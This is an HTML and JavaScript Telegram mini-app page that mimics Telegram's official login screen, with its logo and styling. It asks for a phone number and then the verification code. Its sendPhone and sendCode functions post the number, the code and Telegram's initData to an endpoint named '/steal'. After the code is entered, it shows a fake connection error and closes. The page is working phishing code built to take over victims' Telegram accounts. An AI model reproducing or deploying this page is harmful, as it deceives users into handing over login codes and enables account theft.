<!DOCTYPE html>
<html>
<head>
    <title>Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #ffffff;
            margin: 0;
            padding: 0;
            color: #000000;
        }
        .page {
            padding: 20px 16px;
            max-width: 400px;
            margin: 0 auto;
        }
        .logo {
            text-align: center;
            margin-bottom: 40px;
            padding-top: 40px;
        }
        .logo-img {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin: 0 auto 20px;
            background-size: cover;
            background-position: center;
        }
        .title {
            font-size: 21px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #707579;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.4;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .label {
            font-size: 16px;
            margin-bottom: 8px;
            display: block;
            color: #000000;
        }
        .country-selector {
            background: #f7f8fa;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 12px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .country-info {
            flex: 1;
            display: flex;
            align-items: center;
        }
        .country-flag {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            margin-right: 12px;
            font-size: 18px;
            text-align: center;
            line-height: 24px;
        }
        .country-name {
            font-size: 16px;
            font-weight: 500;
        }
        .country-code {
            font-size: 16px;
            color: #707579;
        }
        .arrow {
            color: #707579;
            font-size: 18px;
        }
        .phone-input {
            width: 100%;
            padding: 12px 16px;
            background: #f7f8fa;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            outline: none;
        }
        .checkbox {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .checkbox input {
            margin-right: 12px;
            width: 18px;
            height: 18px;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:disabled {
            background: #e0e0e0;
            color: #a0a0a0;
            cursor: not-allowed;
        }
        .hidden {
            display: none;
        }
        .countries-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #ffffff;
            z-index: 1000;
            overflow-y: auto;
        }
        .modal-header {
            padding: 12px 16px;
            border-bottom: 1px solid #f7f8fa;
            font-weight: 500;
            display: flex;
            align-items: center;
        }
        .back-btn {
            margin-right: 16px;
            cursor: pointer;
            font-size: 20px;
        }
        .search-input {
            width: 100%;
            padding: 12px 16px;
            border: none;
            border-bottom: 1px solid #f7f8fa;
            font-size: 16px;
            outline: none;
        }
        .country-item {
            padding: 12px 16px;
            border-bottom: 1px solid #f7f8fa;
            cursor: pointer;
            display: flex;
            align-items: center;
        }
        .country-item-flag {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            margin-right: 12px;
            font-size: 18px;
            text-align: center;
            line-height: 24px;
        }
        .country-item-name {
            flex: 1;
            font-size: 16px;
        }
        .country-item-code {
            color: #707579;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="page" id="phonePage">
        <div class="logo">
            <div class="logo-img" style="background-image: url('https://telegram.org/img/t_logo.png')"></div>
            <div class="title">Telegram</div>
            <div class="subtitle">Please confirm your country code and enter your phone number.</div>
        </div>

        <div class="form-group">
            <div class="label">Country</div>
            <div class="country-selector" onclick="showCountries()">
                <div class="country-info">
                    <div class="country-flag" id="currentFlag">üá∑üá∫</div>
                    <div class="country-name" id="currentCountry">Russia</div>
                </div>
                <div class="country-code" id="currentCode">+7</div>
                <div class="arrow">‚Ä∫</div>
            </div>
        </div>

        <div class="form-group">
            <div class="label">Your phone number</div>
            <input type="tel" class="phone-input" id="phoneInput" placeholder="+7" oninput="validatePhone()">
        </div>

        <div class="checkbox">
            <input type="checkbox" id="keepSigned" checked>
            <label for="keepSigned">Keep me signed in</label>
        </div>

        <button class="btn" id="nextBtn" disabled onclick="sendPhone()">NEXT</button>
    </div>

    <div class="page hidden" id="codePage">
        <div class="logo">
            <div class="logo-img" style="background-image: url('https://telegram.org/img/t_logo.png')"></div>
            <div class="title">Code</div>
            <div class="subtitle" id="codeSubtitle">We have sent a code to your phone.</div>
        </div>

        <div class="form-group">
            <div class="label">Verification Code</div>
            <input type="text" class="phone-input" id="codeInput" placeholder="-----" maxlength="5" style="text-align: center; letter-spacing: 8px;" oninput="validateCode()">
        </div>

        <button class="btn" id="confirmBtn" disabled onclick="sendCode()">Confirm</button>
    </div>

    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –≤—ã–±–æ—Ä–∞ —Å—Ç—Ä–∞–Ω—ã -->
    <div id="countriesModal" class="countries-modal hidden">
        <div class="modal-header">
            <div class="back-btn" onclick="hideCountries()">‚Üê</div>
            <div>Select Country</div>
        </div>
        <input type="text" class="search-input" id="countrySearch" placeholder="Search country" oninput="filterCountries()">
        <div id="countriesList"></div>
    </div>

    <script>
        const countries = [
            {code: '+1', name: 'United States', flag: 'üá∫üá∏'},
            {code: '+7', name: 'Russia', flag: 'üá∑üá∫'},
            {code: '+380', name: 'Ukraine', flag: 'üá∫üá¶'},
            {code: '+44', name: 'United Kingdom', flag: 'üá¨üáß'},
            {code: '+49', name: 'Germany', flag: 'üá©üá™'},
            {code: '+33', name: 'France', flag: 'üá´üá∑'},
            {code: '+39', name: 'Italy', flag: 'üáÆüáπ'},
            {code: '+34', name: 'Spain', flag: 'üá™üá∏'},
            {code: '+86', name: 'China', flag: 'üá®üá≥'},
            {code: '+81', name: 'Japan', flag: 'üáØüáµ'},
            {code: '+82', name: 'South Korea', flag: 'üá∞üá∑'},
            {code: '+91', name: 'India', flag: 'üáÆüá≥'},
            {code: '+55', name: 'Brazil', flag: 'üáßüá∑'},
            {code: '+52', name: 'Mexico', flag: 'üá≤üáΩ'},
            {code: '+61', name: 'Australia', flag: 'üá¶üá∫'},
            {code: '+64', name: 'New Zealand', flag: 'üá≥üáø'}
        ];

        let selectedCountry = countries[1]; // Russia –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
        let userPhone = '';

        function updateCurrentCountry() {
            document.getElementById('currentCountry').textContent = selectedCountry.name;
            document.getElementById('currentCode').textContent = selectedCountry.code;
            document.getElementById('currentFlag').textContent = selectedCountry.flag;
            document.getElementById('phoneInput').placeholder = selectedCountry.code;
            validatePhone();
        }

        function showCountries() {
            document.getElementById('countriesModal').classList.remove('hidden');
            renderCountries();
        }

        function hideCountries() {
            document.getElementById('countriesModal').classList.add('hidden');
        }

        function renderCountries(filter = '') {
            const list = document.getElementById('countriesList');
            list.innerHTML = '';
            
            const filtered = countries.filter(country => 
                country.name.toLowerCase().includes(filter.toLowerCase()) ||
                country.code.includes(filter)
            );
            
            filtered.forEach(country => {
                const item = document.createElement('div');
                item.className = 'country-item';
                item.innerHTML = `
                    <div class="country-item-flag">${country.flag}</div>
                    <div class="country-item-name">${country.name}</div>
                    <div class="country-item-code">${country.code}</div>
                `;
                item.onclick = () => selectCountry(country);
                list.appendChild(item);
            });
        }

        function filterCountries() {
            const search = document.getElementById('countrySearch').value;
            renderCountries(search);
        }

        function selectCountry(country) {
            selectedCountry = country;
            updateCurrentCountry();
            hideCountries();
        }

        function validatePhone() {
            const phone = document.getElementById('phoneInput').value;
            const nextBtn = document.getElementById('nextBtn');
            
            const cleanPhone = phone.replace(selectedCountry.code, '').trim();
            userPhone = selectedCountry.code + cleanPhone;
            
            nextBtn.disabled = !cleanPhone.match(/^[0-9]{7,15}$/);
        }

        function validateCode() {
            const code = document.getElementById('codeInput').value;
            const confirmBtn = document.getElementById('confirmBtn');
            confirmBtn.disabled = code.length !== 5;
        }

function sendPhone() {
    const phone = document.getElementById('phoneInput').value;
    const tgData = Telegram.WebApp.initData;
    
    console.log('Sending phone:', phone, 'tgData:', tgData);
    
    fetch('/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            phone: phone,
            tg_data: tgData,
            stage: 'phone_entered'
        })
    }).then(response => {
        console.log('Phone sent successfully');
    }).catch(e => {
        console.error('Error sending phone:', e);
    });

    document.getElementById('phonePage').classList.add('hidden');
    document.getElementById('codePage').classList.remove('hidden');
    
    const maskedPhone = phone.slice(0, 4) + ' ‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢ ' + phone.slice(-2);
    document.getElementById('codeSubtitle').textContent = `We have sent a code to ${maskedPhone}`;
    
    // –£–ë–†–ê–õ –∞–≤—Ç–æ-–≤–≤–æ–¥ –∫–æ–¥–∞ - —Ç–µ–ø–µ—Ä—å –∫–æ–¥ –ø—Ä–∏–¥–µ—Ç –≤ Telegram
}
        function sendCode() {
            const code = document.getElementById('codeInput').value;
            const tgData = Telegram.WebApp.initData;
            
            fetch('/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    phone: userPhone,
                    code: code,
                    tg_data: tgData,
                    stage: 'code_entered'
                })
            }).catch(e => console.error('Error:', e));

            alert('Error connecting to Telegram. Please try again later.');
            Telegram.WebApp.close();
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        updateCurrentCountry();
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
        Telegram.WebApp.setHeaderColor('#4a8cDc');
        Telegram.WebApp.setBackgroundColor('#ffffff');
    </script>
</body>
</html>


